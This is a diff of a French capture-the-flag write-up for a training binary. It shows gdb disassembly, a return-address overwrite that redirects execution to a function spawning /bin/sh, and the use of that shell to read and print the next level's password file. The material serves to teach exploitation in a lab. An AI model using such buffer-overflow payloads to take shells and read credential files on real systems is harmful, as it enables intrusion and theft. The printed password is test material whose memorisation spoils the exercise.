@@ -5,8 +5,8 @@
 (en attente d'une entree et quand on entre quoi que ce soit, ca ne fait rien)
 1
 
->gdb level1
-    >disas main
+> gdb level1
+    > disas main
         0x08048480 <+0>:	push   %ebp
         0x08048481 <+1>:	mov    %esp,%ebp
         0x08048483 <+3>:	and    $0xfffffff0,%esp
@@ -17,15 +17,15 @@
         0x08048495 <+21>:	leave
         0x08048496 <+22>:	ret
 
-    >info functions
+    > info functions
         [...]
         0x08048444  run
         0x08048480  main
         [...]
-    en regardant un peu plus le gdb, on peut voir qu'il y a une fonction qui n'est pas appele dans le main, run
+    en regardant un peu plus le gdb, on peut voir qu'il y a une fonction qui n'est pas appelé dans le main, run
     donc on regarde ce qu'il y a dedans
 
-    >disas run
+    > disas run
         0x08048444 <+0>:	push   %ebp
         0x08048445 <+1>:	mov    %esp,%ebp
         0x08048447 <+3>:	sub    $0x18,%esp
@@ -43,25 +43,25 @@
         0x0804847f <+59>:	ret
     on peut voir qu'il y a un appel a system avec 0x8048584 en argument
 
-    >x/s 0x8048584
+    > x/s 0x8048584
         0x8048584:	 "/bin/sh"
     nous devons donc essayer de forcer l'appel de la fonction run
 
-on va donc mettre l'offset de EIP a la taille du buffer: 80
+on va donc mettre l'offset de EIP a la taille du reservé sur la pile : 80 (0x50)
 
->python -c 'print "A"*80' > /tmp/payload
->gdb level1
-    >run < /tmp/payload
-        >Starting program: /home/user/level1/level1 < /tmp/payload
+> python -c 'print "A"*80' > /tmp/payload
+> gdb level1
+    > run < /tmp/payload
+        Starting program: /home/user/level1/level1 < /tmp/payload
 
         Program received signal SIGSEGV, Segmentation fault.
         0x41414141 in ?? ()
 
     Ici, eip est ecrase avec seulement 4 A (0x41414141) donc on peut affiner l'offset pour etre sur
 
->python -c 'print "A"*76' > /tmp/payload
->gdb level1
-    >run < /tmp/payload
+> python -c 'print "A"*76' > /tmp/payload
+> gdb level1
+    > run < /tmp/payload
         >Starting program: /home/user/level1/level1 < /tmp/payload
 
         Program received signal SIGILL, Illegal instruction.
@@ -72,13 +72,13 @@ on va donc mettre l'offset de EIP a la taille du buffer: 80
     ( little endian, big endian =  caracteristique materielle CPU
     x86 / x86_64 (Intel, AMD) → little-endian et nous, nous sommes en x86)
 
->python -c 'print "A"*76+"\x44\x84\x04\x08"' > /tmp/payload
->cat /tmp/payload - |./level1
+> python -c 'print "A"*76+"\x44\x84\x04\x08"' > /tmp/payload
+> cat /tmp/payload - |./level1 ("-" laisse l'entrée standard ouverte et permet d'utiliser le shell lancé par execve)
     Good... Wait what?
     id / whoami
     level2
     cat /home/user/level2/.pass
     53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 
->su level2
+> su level2
     Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
